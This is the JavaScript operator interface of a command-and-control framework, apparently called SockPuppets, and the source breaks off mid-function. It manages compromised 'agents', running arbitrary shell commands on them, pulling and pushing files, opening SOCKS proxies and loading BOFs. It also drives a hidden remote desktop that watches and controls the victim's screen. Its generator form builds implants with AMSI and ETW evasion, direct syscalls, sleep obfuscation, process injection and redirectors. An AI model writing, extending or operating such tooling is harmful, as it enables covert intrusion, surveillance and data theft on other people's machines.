// SockPuppets GUI — Client Application

(function() {
    'use strict';

    // --- State ---
    var ws = null;
    var token = '';
    var operatorName = '';
    var agents = [];
    var selectedAgentId = null;
    var consoleTabs = {};  // agentId -> {tab, pane}

    var API = '/api';

    function escapeHtml(str) {
        if (!str) return '';
        return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
    }

    // --- Auth helpers ---
    function headers() {
        return { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' };
    }

    async function api(method, path, body) {
        var opts = { method: method, headers: headers() };
        if (body) opts.body = JSON.stringify(body);
        var resp = await fetch(API + path, opts);
        if (!resp.ok) throw new Error(resp.status + ': ' + (await resp.text()));
        return resp.json();
    }

    // --- Login ---
    function showLoginError(msg) {
        var el = document.getElementById('login-error');
        el.textContent = msg;
        el.classList.remove('hidden');
    }

    function hideLoginError() {
        document.getElementById('login-error').classList.add('hidden');
    }

    function showChangePasswordForm() {
        document.getElementById('login-form').classList.add('hidden');
        document.getElementById('change-password-form').classList.remove('hidden');
        document.getElementById('new-password').focus();
    }

    function showLoginForm() {
        document.getElementById('login-form').classList.remove('hidden');
        document.getElementById('change-password-form').classList.add('hidden');
    }

    document.getElementById('login-btn').addEventListener('click', async function() {
        var username = document.getElementById('login-username').value.trim();
        var password = document.getElementById('login-password').value;
        if (!username || !password) return;

        hideLoginError();

        try {
            var resp = await fetch(API + '/auth/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: username, password: password })
            });

            if (!resp.ok) {
                var err = await resp.json().catch(function() { return { detail: 'Login failed' }; });
                showLoginError(err.detail || 'Invalid username or password');
                return;
            }

            var data = await resp.json();
            token = data.token;
            operatorName = data.operator;
            sessionStorage.setItem('sp_token', token);
            sessionStorage.setItem('sp_operator', operatorName);

            if (data.must_change_password) {
                showChangePasswordForm();
            } else {
                connectWebSocket();
            }
        } catch(e) {
            showLoginError('Connection error: ' + e.message);
        }
    });

    document.getElementById('login-password').addEventListener('keydown', function(e) {
        if (e.key === 'Enter') document.getElementById('login-btn').click();
    });

    document.getElementById('login-username').addEventListener('keydown', function(e) {
        if (e.key === 'Enter') document.getElementById('login-password').focus();
    });

    // --- Change password ---
    document.getElementById('change-pw-btn').addEventListener('click', async function() {
        var newPw = document.getElementById('new-password').value;
        var confirmPw = document.getElementById('confirm-password').value;

        hideLoginError();

        if (!newPw) {
            showLoginError('Password cannot be empty');
            return;
        }
        if (newPw !== confirmPw) {
            showLoginError('Passwords do not match');
            return;
        }

        try {
            var resp = await fetch(API + '/auth/change-password', {
                method: 'POST',
                headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' },
                body: JSON.stringify({ new_password: newPw })
            });

            if (!resp.ok) {
                var err = await resp.json().catch(function() { return { detail: 'Failed to change password' }; });
                showLoginError(err.detail || 'Failed to change password');
                return;
            }

            connectWebSocket();
        } catch(e) {
            showLoginError('Connection error: ' + e.message);
        }
    });

    document.getElementById('confirm-password').addEventListener('keydown', function(e) {
        if (e.key === 'Enter') document.getElementById('change-pw-btn').click();
    });

    // Auto-login from sessionStorage
    (function() {
        var saved = sessionStorage.getItem('sp_token');
        if (saved) {
            token = saved;
            operatorName = sessionStorage.getItem('sp_operator') || 'operator';
            connectWebSocket();
        }
    })();

    // --- WebSocket ---
    var wsRetryCount = 0;
    function connectWebSocket() {
        var proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
        ws = new WebSocket(proto + '//' + location.host + '/api/ws?name=' + encodeURIComponent(operatorName));

        ws.onopen = function() {
            ws.send(JSON.stringify({type: 'auth', token: token}));
            wsRetryCount = 0;
            document.getElementById('login-overlay').classList.add('hidden');
            document.getElementById('app').classList.remove('hidden');
            document.getElementById('server-status').className = 'status-dot green';
            document.getElementById('server-info').textContent = 'Connected';
            loadProfiles();
            loadPatterns();
            loadRedirectors();
            loadListeners();
        };

        ws.onmessage = function(e) {
            var data = JSON.parse(e.data);
            handleEvent(data);
        };

        ws.onclose = function(e) {
            document.getElementById('server-status').className = 'status-dot red';
            document.getElementById('server-info').textContent = 'Disconnected';
            if (e.code === 4001) {
                sessionStorage.removeItem('sp_token');
                sessionStorage.removeItem('sp_operator');
                token = '';
                wsRetryCount = 0;
                showLoginForm();
                document.getElementById('login-overlay').classList.remove('hidden');
                document.getElementById('app').classList.add('hidden');
            } else if (token) {
                if (wsRetryCount < 20) {
                    var delay = Math.min(3000 * Math.pow(1.5, wsRetryCount), 60000);
                    delay += Math.random() * 1000;
                    wsRetryCount++;
                    document.getElementById('server-info').textContent = 'Reconnecting (' + wsRetryCount + '/20)...';
                    setTimeout(connectWebSocket, delay);
                } else {
                    document.getElementById('server-info').textContent = 'Connection lost';
                }
            }
        };
    }

    // --- Event handler ---
    function handleEvent(data) {
        switch(data.event) {
            case 'snapshot':
                agents = data.agents || [];
                renderAgentTable();
                updateOperators(data.operators || []);
                break;
            case 'agent_registered':
                var existing = agents.findIndex(function(a) { return a.id === data.agent.id; });
                if (existing >= 0) agents[existing] = data.agent;
                else agents.push(data.agent);
                renderAgentTable();
                addEventLog('agent_registered', data.agent.id + ' (' + (data.agent.hostname || 'Unknown') + ') connected');
                break;
            case 'agent_disconnected':
                addEventLog('agent_disconnected', data.agent_id + ' disconnected');
                refreshAgents();
                break;
            case 'agent_result':
                addEventLog('agent_result', data.agent_id + ': ' + data.command);
                if (consoleTabs[data.agent_id]) {
                    if (data.output && String(data.output).indexOf('HDIMG:') === 0) showDesktopFrame(data.agent_id, data.output);
                    else appendConsole(data.agent_id, data.output, 'output');
                }
                for (var i = 0; i < agents.length; i++) {
                    if (agents[i].id === data.agent_id) {
                        agents[i].last_seen = new Date().toISOString();
                        break;
                    }
                }
                renderAgentTable();
                break;
            case 'command_sent':
            case 'command_queued':
                addEventLog(data.event, '[' + (data.operator || 'op') + '] ' + data.agent_id + ': ' + data.command);
                break;
            case 'agent_checkin':
                addEventLog('agent_checkin', data.agent_id + ' checkin ' + (data.transport || ''));
                break;
            case 'listener_started':
                addEventLog('listener_started', (data.listener_type || '') + ' ' + data.host + ':' + data.port);
                loadListeners();
                break;
            case 'beacon_generated':
                addEventLog('beacon_generated', (data.lang || 'agent') + ' ' + (data.path || ''));
                break;
            case 'operator_connected':
            case 'operator_disconnected':
                updateOperators(data.operators || []);
                addEventLog(data.event, data.operator);
                break;
        }
    }

    // --- Agent table ---
    async function refreshAgents() {
        try {
            agents = await api('GET', '/agents');
            renderAgentTable();
        } catch(e) { console.error(e); }
    }

    function formatSleep(agent) {
        if (agent.mode !== 'beacon') return '<span class="sleep-info">—</span>';
        var s = parseInt(agent.beacon_interval, 10) || 60;
        var j = parseInt(agent.beacon_jitter, 10) || 0;
        var label = s + 's';
        if (j > 0) label += ' ' + j + '% jitter';
        return '<span class="sleep-info">' + label + '</span>';
    }

    function formatAgo(isoStr) {
        if (!isoStr) return '';
        var then = new Date(isoStr);
        if (isNaN(then.getTime())) return isoStr;
        var diff = Math.floor((Date.now() - then.getTime()) / 1000);
        if (diff < 0) diff = 0;
        if (diff < 60) return diff + 's ago';
        if (diff < 3600) return Math.floor(diff / 60) + 'm ' + (diff % 60) + 's ago';
        var h = Math.floor(diff / 3600);
        var m = Math.floor((diff % 3600) / 60);
        return h + 'h ' + m + 'm ago';
    }

    function renderAgentTable() {
        var tbody = document.getElementById('agent-tbody');
        var empty = document.getElementById('no-agents');
        tbody.innerHTML = '';

        if (agents.length === 0) {
            empty.classList.remove('hidden');
            return;
        }
        empty.classList.add('hidden');

        for (var i = 0; i < agents.length; i++) {
            var agent = agents[i];
            var tr = document.createElement('tr');
            tr.dataset.agentId = agent.id;
            var healthClass = agent.active !== false ? 'healthy' : (agent.health_warning ? 'dead' : 'stale');
            var modeBadge = agent.mode === 'beacon' ? '<span class="badge beacon">BEACON</span>' : '<span class="badge stream">STREAM</span>';

            tr.innerHTML =
                '<td class="agent-id">' + escapeHtml(agent.id) + '</td>' +
                '<td>' + escapeHtml(agent.hostname || 'Unknown') + '</td>' +
                '<td>' + escapeHtml(agent.username || 'Unknown') + '</td>' +
                '<td>' + escapeHtml(agent.os || 'Unknown') + '</td>' +
                '<td>' + escapeHtml(agent.ip || 'Unknown') + '</td>' +
                '<td>' + modeBadge + '</td>' +
                '<td>' + formatSleep(agent) + '</td>' +
                '<td><span class="health-dot ' + healthClass + '"></span></td>' +
                '<td class="last-seen-cell" data-ts="' + escapeHtml(agent.last_seen || '') + '">' + formatAgo(agent.last_seen) + '</td>';

            (function(agentId) {
                tr.addEventListener('contextmenu', function(e) { showContextMenu(e, agentId); });
                tr.addEventListener('dblclick', function() { openConsole(agentId); });
            })(agent.id);

            tbody.appendChild(tr);
        }
    }

    setInterval(function() {
        var cells = document.querySelectorAll('.last-seen-cell');
        for (var i = 0; i < cells.length; i++) {
            var ts = cells[i].getAttribute('data-ts');
            if (ts) cells[i].textContent = formatAgo(ts);
        }
    }, 1000);

    // --- Context menu ---
    function showContextMenu(e, agentId) {
        e.preventDefault();
        selectedAgentId = agentId;
        var menu = document.getElementById('context-menu');
        menu.style.left = e.pageX + 'px';
        menu.style.top = e.pageY + 'px';
        menu.classList.remove('hidden');
    }

    document.addEventListener('click', function() {
        document.getElementById('context-menu').classList.add('hidden');
    });

    document.querySelectorAll('#context-menu button').forEach(function(btn) {
        btn.addEventListener('click', function() { handleContextAction(btn.dataset.action); });
    });

    async function handleContextAction(action) {
        if (!selectedAgentId) return;
        try {
            switch(action) {
                case 'interact':
                    openConsole(selectedAgentId);
                    break;
                case 'desktop':
                    openDesktop(selectedAgentId);
                    break;
                case 'bof':
                    document.getElementById('bof-file').click();
                    break;
                case 'sleep':
                    var interval = prompt('Beacon interval (seconds):');
                    if (interval) await api('POST', '/agents/' + selectedAgentId + '/sleep', { interval: parseInt(interval) });
                    break;
                case 'socks':
                    var port = prompt('SOCKS proxy port:');
                    if (port) await api('POST', '/agents/' + selectedAgentId + '/socks', { port: parseInt(port) });
                    break;
                case 'ps':
                    await api('POST', '/agents/' + selectedAgentId + '/postex', { op: 'ps' });
                    break;
                case 'recon':
                    await api('POST', '/agents/' + selectedAgentId + '/postex', { op: 'recon' });
                    break;
                case 'files':
                    openConsole(selectedAgentId);
                    listFiles(selectedAgentId);
                    break;
                case 'download':
                    var dl = prompt('Remote file path:');
                    if (dl) await api('POST', '/agents/' + selectedAgentId + '/postex', { op: 'download', path: dl });
                    break;
                case 'upload':
                    var up = prompt('Remote path and base64, separated by |:');
                    if (up && up.indexOf('|') > 0) {
                        var parts = up.split('|');
                        await api('POST', '/agents/' + selectedAgentId + '/postex', { op: 'upload', path: parts[0], data: parts.slice(1).join('|') });
                    }
                    break;
                case 'upgrade':
                    await api('POST', '/agents/' + selectedAgentId + '/upgrade');
                    break;
                case 'downgrade':
                    var di = prompt('Beacon interval (seconds):', '60');
                    if (di) await api('POST', '/agents/' + selectedAgentId + '/downgrade', { interval: parseInt(di) });
                    break;
                case 'kill':
                    if (confirm('Kill agent ' + selectedAgentId + '?')) {
                        await api('POST', '/agents/' + selectedAgentId + '/kill');
                        refreshAgents();
                    }
                    break;
            }
        } catch(e) { addEventLog('error', e.message); }
    }

    // --- Console tabs ---
    function openConsole(agentId, focusDesktop) {
        if (!consoleTabs[agentId]) {
            var tab = document.createElement('button');
            tab.className = 'tab';
            tab.dataset.tab = 'console-' + agentId;
            tab.textContent = 'Console: ' + agentId;
            tab.addEventListener('click', function() { switchTab('console-' + agentId); });

            var closeBtn = document.createElement('span');
            closeBtn.className = 'tab-close';
            closeBtn.textContent = '×';
            closeBtn.addEventListener('click', function(e) { e.stopPropagation(); closeConsole(agentId); });
            tab.appendChild(closeBtn);

            document.getElementById('tab-bar').appendChild(tab);

            var pane = document.createElement('div');
            pane.id = 'tab-console-' + agentId;
            pane.className = 'tab-pane console-pane';
            pane.innerHTML =
                '<div class="console-output" id="console-output-' + escapeHtml(agentId) + '"></div>' +
                '<div class="console-input-row">' +
                    '<span class="console-prompt">agent[' + escapeHtml(agentId) + ']&gt;</span>' +
                    '<input type="text" class="console-input" id="console-input-' + escapeHtml(agentId) + '" autocomplete="off">' +
                '</div>' +
                '<div class="hd-pane" id="hd-' + escapeHtml(agentId) + '">' +
                    '<div class="hd-bar">' +
                        '<span>Hidden Desktop</span>' +
                        '<span class="hd-status" id="hd-status-' + escapeHtml(agentId) + '">idle</span>' +
                        '<button type="button" class="glass-btn" data-hd="start">Start</button>' +
                        '<button type="button" class="glass-btn" data-hd="frame">Frame</button>' +
                        '<button type="button" class="glass-btn" data-hd="stop">Stop</button>' +
                    '</div>' +
                    '<canvas class="hd-img" id="hd-canvas-' + escapeHtml(agentId) + '" tabindex="0" style="display:none"></canvas>' +
                    '<img class="hd-img" id="hd-img-' + escapeHtml(agentId) + '" alt="" tabindex="0" style="display:none">' +
                    '<input type="text" class="hd-type" id="hd-type-' + escapeHtml(agentId) + '" placeholder="Type on the hidden desktop, Enter to send">' +
                '</div>' +
                '<div class="fs-pane" id="fs-' + escapeHtml(agentId) + '">' +
                    '<div class="hd-bar">' +
                        '<span>Files</span>' +
                        '<input type="text" class="fs-path" id="fs-path-' + escapeHtml(agentId) + '" value="C:\\Users\\Public">' +
                        '<button type="button" class="glass-btn" data-fs="list">List</button>' +
                        '<button type="button" class="glass-btn" data-fs="up">Up</button>' +
                        '<label class="glass-btn">Upload<input type="file" class="fs-upload" id="fs-up-' + escapeHtml(agentId) + '" hidden></label>' +
                    '</div>' +
                    '<div class="fs-list" id="fs-list-' + escapeHtml(agentId) + '"></div>' +
                '</div>';
            document.getElementById('tab-content').appendChild(pane);

            var input = document.getElementById('console-input-' + agentId);
            (function(aid) {
                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Enter') {
                        var cmd = input.value.trim();
                        if (!cmd) return;
                        input.value = '';
                        appendConsole(aid, 'agent[' + aid + ']> ' + cmd, 'command');
                        sendCommand(aid, cmd);
                    }
                });
            })(agentId);

            pane.querySelectorAll('[data-hd]').forEach(function(btn) {
                btn.addEventListener('click', function() { desktopActionFor(agentId, btn.dataset.hd); });
            });
            function visibleDesktop() {
                var canvas = document.getElementById('hd-canvas-' + agentId);
                var img = document.getElementById('hd-img-' + agentId);
                if (canvas && canvas.style.display !== 'none') return canvas;
                if (img && img.style.display !== 'none') return img;
                return canvas || img;
            }
            function desktopClick(e, right) {
                var img = visibleDesktop();
                if (!img || (e.target !== img && !img.contains(e.target))) return;
                e.preventDefault();
                e.stopPropagation();
                var rect = img.getBoundingClientRect();
                if (!rect.width || !rect.height) return;
                var screen = desktopScreen[agentId] || {w: img.width || 1280, h: img.height || 800};
                var x = Math.round((e.clientX - rect.left) / rect.width * screen.w);
                var y = Math.round((e.clientY - rect.top) / rect.height * screen.h);
                if (x < 0) x = 0;
                if (y < 0) y = 0;
                if (x >= screen.w) x = screen.w - 1;
                if (y >= screen.h) y = screen.h - 1;
                var status = document.getElementById('hd-status-' + agentId);
                if (status) status.textContent = (right ? 'rclick ' : 'click ') + x + ' ' + y;
                img.focus();
                desktopActionFor(agentId, (right ? 'rclick ' : 'click ') + x + ' ' + y);
                setTimeout(function() { desktopActionFor(agentId, 'frame'); }, 700);
            }
            var hdPane = document.getElementById('hd-' + agentId);
            hdPane.addEventListener('pointerdown', function(e) { desktopClick(e, e.button === 2); });
            hdPane.addEventListener('contextmenu', function(e) { e.preventDefault(); });
            img.addEventListener('keydown', function(e) {
                if (e.key.length === 1) desktopActionFor(agentId, 'type ' + e.key);
                else if (e.key === 'Enter') desktopActionFor(agentId, 'key 13');
                else if (e.key === 'Backspace') desktopActionFor(agentId, 'key 8');
            });
            var typer = document.getElementById('hd-type-' + agentId);
            typer.addEventListener('keydown', function(e) {
                if (e.key !== 'Enter') return;
                e.preventDefault();
                if (!typer.value) return;
                desktopActionFor(agentId, 'type ' + typer.value);
                typer.value = '';
            });
            pane.querySelector('[data-fs="list"]').addEventListener('click', function() { listFiles(agentId); });
            pane.querySelector('[data-fs="up"]').addEventListener('click', function() {
                var box = document.getElementById('fs-path-' + agentId);
                var parts = box.value.replace(/\\+$/, '').split('\\');
                if (parts.length > 1) parts.pop();
                box.value = parts.join('\\') || 'C:\\';
                listFiles(agentId);
            });
            pane.querySelector('.fs-upload').addEventListener('change', function(ev) {
                var file = ev.target.files && ev.target.files[0];
                ev.target.value = '';
                if (!file) return;
                if (file.size > 400000) { addEventLog('files', 'upload too large'); return; }
                var reader = new FileReader();
                reader.onload = function() {
                    var b64 = String(reader.result).split(',')[1] || '';
                    var dest = document.getElementById('fs-path-' + agentId).value.replace(/\\+$/, '') + '\\' + file.name;
                    api('POST', '/agents/' + agentId + '/command', { command: '__fs:put:' + dest + '\t' + b64 });
                    addEventLog('files', 'upload ' + dest);
                };
                reader.readAsDataURL(file);
            });
            consoleTabs[agentId] = { tab: tab, pane: pane, focusDesktop: false };
        }
        if (focusDesktop && consoleTabs[agentId]) consoleTabs[agentId].focusDesktop = true;
        switchTab('console-' + agentId);
        if (consoleTabs[agentId] && consoleTabs[agentId].focusDesktop) {
            var desk = document.getElementById('hd-img-' + agentId);
            if (desk) desk.focus();
        } else {
            document.getElementById('console-input-' + agentId).focus();
        }
    }

    function closeConsole(agentId) {
        var entry = consoleTabs[agentId];
        if (!entry) return;
        entry.tab.remove();
        entry.pane.remove();
        delete consoleTabs[agentId];
        switchTab('event-log');
    }

    function appendConsole(agentId, text, type) {
        var output = document.getElementById('console-output-' + agentId);
        if (!output) return;
        var line = document.createElement('div');
        line.className = 'console-line ' + type;
        line.textContent = text;
        output.appendChild(line);
        output.scrollTop = output.scrollHeight;
    }

    var HELP_TEXT = [
        'SockPuppets Agent Console',
        '─────────────────────────',
        'Shell Commands:',
        '  <any command>      Execute via cmd.exe / sh',
        '  cd <dir>           Change working directory',
        '',
        'Agent Control:',
        '  __kill             Terminate agent process',
        '  __sleep <secs>     Set beacon interval',
        '',
        'Built-in:',
        '  help               Show this help',
        '  clear              Clear console output',
    ].join('\n');

    async function sendCommand(agentId, command) {
        if (command === 'help') {
            appendConsole(agentId, HELP_TEXT, 'info');
            return;
        }
        if (command === 'clear') {
            var output = document.getElementById('console-output-' + agentId);
            if (output) output.innerHTML = '';
            return;
        }
        if (command.indexOf('desktop ') === 0) {
            command = '__hd:' + command.slice(8);
        }
        try {
            var result = await api('POST', '/agents/' + agentId + '/command', { command: command });
            if (result.output) {
                appendConsole(agentId, result.output, 'output');
            } else if (result.queued) {
                appendConsole(agentId, result.message, 'info');
            }
        } catch(e) {
            appendConsole(agentId, 'Error: ' + e.message, 'error');
        }
    }

    // --- Tab switching ---
    function switchTab(tabId) {
        document.querySelectorAll('.tab').forEach(function(t) { t.classList.toggle('active', t.dataset.tab === tabId); });
        document.querySelectorAll('.tab-pane').forEach(function(p) { p.classList.toggle('active', p.id === 'tab-' + tabId); });
    }

    // --- Event log ---
    function addEventLog(type, message) {
        var log = document.getElementById('event-log');
        var entry = document.createElement('div');
        entry.className = 'event-entry event-' + type;
        var time = new Date().toLocaleTimeString();
        entry.innerHTML = '<span class="event-time">' + time + '</span> <span class="event-type">[' + escapeHtml(type) + ']</span> ' + escapeHtml(message);
        log.appendChild(entry);
        log.scrollTop = log.scrollHeight;
    }

    // --- Output format toggle ---
    var fmtSelect = document.getElementById('output-format-select');
    if (fmtSelect) {
        fmtSelect.addEventListener('change', function() {
            var row = document.getElementById('shellcode-format-row');
            if (this.value === 'shellcode') row.classList.remove('hidden');
            else row.classList.add('hidden');
        });
    }

    // --- Generate modal ---
    document.getElementById('btn-generate').addEventListener('click', function() {
        document.getElementById('generate-modal').classList.remove('hidden');
    });
    document.getElementById('generate-cancel').addEventListener('click', function() {
        document.getElementById('generate-modal').classList.add('hidden');
    });
    document.getElementById('generate-form').addEventListener('submit', async function(e) {
        e.preventDefault();
        var form = new FormData(e.target);
        var body = {
            host: form.get('host'),
            port: parseInt(form.get('port')),
            key: form.get('key') || 'SOCKPUPPETS_KEY_2026',
            beacon_mode: form.get('beacon_mode') === 'true',
            interval: parseInt(form.get('interval')) || 60,
            jitter: parseInt(form.get('jitter')) || 0,
            profile: form.get('profile') || 'default',
            patterns: form.get('patterns') || 'default',
            redirector: form.get('redirector') || null,
            amsi: !!form.get('amsi'),
            etw: !!form.get('etw'),
            syscalls: form.get('syscalls') || null,
            sleep_obf: form.get('sleep_obf') || null,
            inject: form.get('inject') || null,
            lang: form.get('lang') || 'go',
            output_format: form.get('output_format') || 'exe',
            shellcode_format: form.get('shellcode_format') || 'raw',
        };
        try {
            var result = await api('POST', '/generate', body);
            var div = document.getElementById('generate-results');
            div.classList.remove('hidden');
            div.innerHTML = '<h3>Generated Agents</h3>' +
                Object.entries(result.agents).map(function(entry) {
                    var type = entry[0], path = entry[1];
                    return '<div class="gen-result"><strong>' + escapeHtml(type) + ':</strong> <a href="/api/download/' + encodeURIComponent(path.split('/').pop()) + '?token=' + encodeURIComponent(token) + '" target="_blank">' + escapeHtml(path) + '</a></div>';
                }).join('');
        } catch(e) {
            addEventLog('error', 'Generate failed: ' + e.message);
        }
    });

    // --- Load dropdowns ---
    async function loadProfiles() {
        try {
            var profiles = await api('GET', '/profiles');
            var select = document.getElementById('profile-select');
            select.innerHTML = profiles.map(function(p) { return '<option value="' + escapeHtml(p.name) + '">' + escapeHtml(p.name) + (p.description ? ' — ' + escapeHtml(p.description) : '') + '</option>'; }).join('');
        } catch(e) {}
    }

    async function loadPatterns() {
        try {
            var patterns = await api('GET', '/patterns');
            var select = document.getElementById('patterns-select');
            select.innerHTML = patterns.map(function(p) { return '<option value="' + escapeHtml(p.name) + '">' + escapeHtml(p.name) + '</option>'; }).join('');
        } catch(e) {}
    }

    async function loadRedirectors() {
        try {
            var redirectors = await api('GET', '/redirectors');
            var select = document.getElementById('redirector-select');
            select.innerHTML = '<option value="">None (direct)</option>' +
                redirectors.map(function(r) { return '<option value="' + escapeHtml(r.name) + '">' + escapeHtml(r.name) + (r.domain ? ' (' + escapeHtml(r.domain) + ')' : '') + '</option>'; }).join('');
        } catch(e) {}
    }

    // --- Operators list ---
    function updateOperators(operators) {
        document.getElementById('operators-list').textContent = operators.join(', ');
    }

    // --- Dark mode toggle ---
    document.getElementById('btn-theme').addEventListener('click', function() {
        document.documentElement.dataset.theme =
            document.documentElement.dataset.theme === 'dark' ? 'light' : 'dark';
    });
    if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.documentElement.dataset.theme = 'dark';
    }

    // --- Draggable divider ---
    var divider = document.getElementById('divider');
    var isDragging = false;
    divider.addEventListener('mousedown', function() { isDragging = true; });
    document.addEventListener('mousemove', function(e) {
        if (!isDragging) return;
        var pct = (e.clientY / window.innerHeight) * 100;
        document.getElementById('main-panel').style.height = (pct - 6) + '%';
        document.getElementById('bottom-panel').style.height = (94 - pct) + '%';
    });
    document.addEventListener('mouseup', function() { isDragging = false; });

    var desktopScreen = {};
    var desktopTimers = {};

    function openDesktop(agentId) {
        openConsole(agentId, true);
        watchDesktop(agentId);
        desktopActionFor(agentId, 'start');
        var img = document.getElementById('hd-canvas-' + agentId);
        if (img) img.focus();
    }

    async function listFiles(agentId) {
        var path = document.getElementById('fs-path-' + agentId).value || 'C:\\';
        var ps = path.replace(/\\/g, '/');
        await api('POST', '/agents/' + agentId + '/command', { command: 'powershell -c Get-ChildItem -Name ' + ps });
        addEventLog('files', 'list ' + path);
        setTimeout(function() { showFileList(agentId, path); }, 2500);
    }

    async function showFileList(agentId, path) {
        var box = document.getElementById('fs-list-' + agentId);
        if (!box) return;
        var rows = await api('GET', '/agents/' + agentId + '/results');
        if (!rows) return;
        for (var i = rows.length - 1; i >= 0; i--) {
            var cmd = rows[i].command || '';
            var out = rows[i].output || '';
            if ((cmd.indexOf('dir ') === 0 || cmd.indexOf('__fs:ls:') === 0) && out.indexOf('HDIMG:') !== 0 && out.indexOf('FILE:') !== 0) {
                var entries = [];
                if (cmd.indexOf('__fs:ls:') === 0) {
                    out.split('\n').filter(Boolean).forEach(function(line) {
                        var bits = line.split(' ');
                        var kind = bits.shift();
                        bits.shift();
                        entries.push({ kind: kind, name: bits.join(' ') });
                    });
                } else {
                    out.split('\n').forEach(function(line) {
                        var name = line.trim();
                        if (!name || name === '.' || name === '..') return;
                        if (name.indexOf('File Not Found') === 0 || name.indexOf('Get-ChildItem') === 0) return;
                        entries.push({ kind: name.indexOf('.') < 0 ? 'd' : 'f', name: name });
                    });
                }
                box.innerHTML = entries.map(function(row) {
                    return '<button type="button" class="fs-row" data-kind="' + row.kind + '" data-name="' + escapeHtml(row.name) + '">' +
                        escapeHtml((row.kind === 'd' ? 'dir  ' : 'file ') + row.name) + '</button>';
                }).join('') || escapeHtml(out.slice(0, 400));
                box.querySelectorAll('.fs-row').forEach(function(btn) {
                    btn.addEventListener('click', function() {
                        var next = path.replace(/\\+$/, '') + '\\' + btn.dataset.name;
                        if (btn.dataset.kind === 'd') {
                            document.getElementById('fs-path-' + agentId).value = next;
                            listFiles(agentId);
                        } else {
                            api('POST', '/agents/' + agentId + '/postex', { op: 'download', path: next });
                            addEventLog('files', 'get ' + next);
                            setTimeout(function() { saveRemoteFile(agentId, btn.dataset.name); }, 2500);
                        }
                    });
                });
                return;
            }
        }
    }

    async function saveRemoteFile(agentId, name) {
        var rows = await api('GET', '/agents/' + agentId + '/results');
        if (!rows) return;
        for (var i = rows.length - 1; i >= 0; i--) {
            var out = rows[i].output || '';
            if (out.indexOf('FILE:') === 0) {
                var a = document.createElement('a');
                a.href = 'data:application/octet-stream;base64,' + out.slice(5);
                a.download = name || 'download.bin';
                a.click();
                return;
            }
        }
    }

    var frameBusy = {};
    function watchDesktop(agentId) {
        if (desktopTimers[agentId]) return;
        desktopTimers[agentId] = setInterval(function() {
            if (frameBusy[agentId]) return;
            frameBusy[agentId] = true;
            api('POST', '/agents/' + agentId + '/desktop', { command: 'frame' }).catch(function() {}).then(function() {
                frameBusy[agentId] = false;
                pollDesktop(agentId);
            });
        }, 2000);
    }

    async function desktopActionFor(agentId, action) {
        addEventLog('desktop', agentId + ' ' + action);
        if (action === 'start' || action.indexOf('start ') === 0) watchDesktop(agentId);
        await api('POST', '/agents/' + agentId + '/desktop', { command: action });
        setTimeout(function() { pollDesktop(agentId); }, 800);
    }

    function bmpToPng(b64) {
        var bin = atob(b64.replace(/\s/g, ''));
        var bytes = new Uint8Array(bin.length);
        for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
        var view = new DataView(bytes.buffer);
        var off = view.getUint32(10, true);
        var w = view.getInt32(18, true);
        var h = view.getInt32(22, true);
        var top = h < 0;
        if (top) h = -h;
        var canvas = document.createElement('canvas');
        canvas.width = w;
        canvas.height = h;
        var ctx = canvas.getContext('2d');
        var image = ctx.createImageData(w, h);
        var stride = Math.floor((w * 3 + 3) / 4) * 4;
        for (var y = 0; y < h; y++) {
            var sy = top ? y : (h - 1 - y);
            for (var x = 0; x < w; x++) {
                var s = off + sy * stride + x * 3;
                var d = (y * w + x) * 4;
                image.data[d] = bytes[s + 2];
                image.data[d + 1] = bytes[s + 1];
                image.data[d + 2] = bytes[s];
                image.data[d + 3] = 255;
            }
        }
        ctx.putImageData(image, 0, 0);
        return canvas.toDataURL('image/png');
    }

    var lastFramePayload = {};

    function showDesktopFrame(agentId, out) {
        if (!out || out.indexOf('HDIMG:') !== 0) return;
        var payload = out.slice(6);
        var comma = payload.indexOf(',');
        var colon = payload.indexOf(':');
        desktopScreen[agentId] = desktopScreen[agentId] || {w: 1024, h: 768};
        if (comma > 0 && colon > comma) {
            desktopScreen[agentId].w = parseInt(payload.slice(0, comma), 10) || desktopScreen[agentId].w;
            desktopScreen[agentId].h = parseInt(payload.slice(comma + 1, colon), 10) || desktopScreen[agentId].h;
            payload = payload.slice(colon + 1);
        }
        if (lastFramePayload[agentId] === payload) return;
        var canvas = document.getElementById('hd-canvas-' + agentId);
        var status = document.getElementById('hd-status-' + agentId);
        if (!canvas) return;
        try {
            var url = payload.indexOf('/9j/') === 0 ? ('data:image/jpeg;base64,' + payload) : bmpToPng(payload);
            var next = new Image();
            next.onload = function() {
                var back = document.createElement('canvas');
                back.width = next.naturalWidth;
                back.height = next.naturalHeight;
                back.getContext('2d').drawImage(next, 0, 0);
                if (canvas.width !== back.width || canvas.height !== back.height) {
                    canvas.width = back.width;
                    canvas.height = back.height;
                }
                canvas.getContext('2d').drawImage(back, 0, 0);
                canvas.style.display = 'block';
                lastFramePayload[agentId] = payload;
                if (status && status.textContent.indexOf('click') !== 0 && status.textContent.indexOf('rclick') !== 0) {
                    status.textContent = desktopScreen[agentId].w + 'x' + desktopScreen[agentId].h;
                }
            };
            next.src = url;
        } catch (err) {
            if (status) status.textContent = 'frame decode failed';
        }
    }

    async function pollDesktop(agentId) {
        try {
            var view = await api('GET', '/agents/' + agentId + '/desktop/view');
            if (view) {
                if (view.status) {
                    var status = document.getElementById('hd-status-' + agentId);
                    if (status && view.status.indexOf('HDIMG:') !== 0) status.textContent = view.status;
                }
                if (view.frame) showDesktopFrame(agentId, view.frame);
                if (view.frame || view.status) return;
            }
        } catch (e) {}
        try {
            var rows = await api('GET', '/agents/' + agentId + '/results');
            if (!rows) return;
            for (var i = rows.length - 1; i >= 0; i--) {
                var out = rows[i].output || '';
                var cmd = rows[i].command || '';
                if (cmd.indexOf('__hd:') === 0 && out && out.indexOf('HDIMG:') !== 0) {
                    var status2 = document.getElementById('hd-status-' + agentId);
                    if (status2) status2.textContent = out;
                }
                if (out.indexOf('HDIMG:') === 0) {
                    showDesktopFrame(agentId, out);
                    return;
                }
            }
        } catch (e) {}
    }

    async function loadListeners() {
        try {
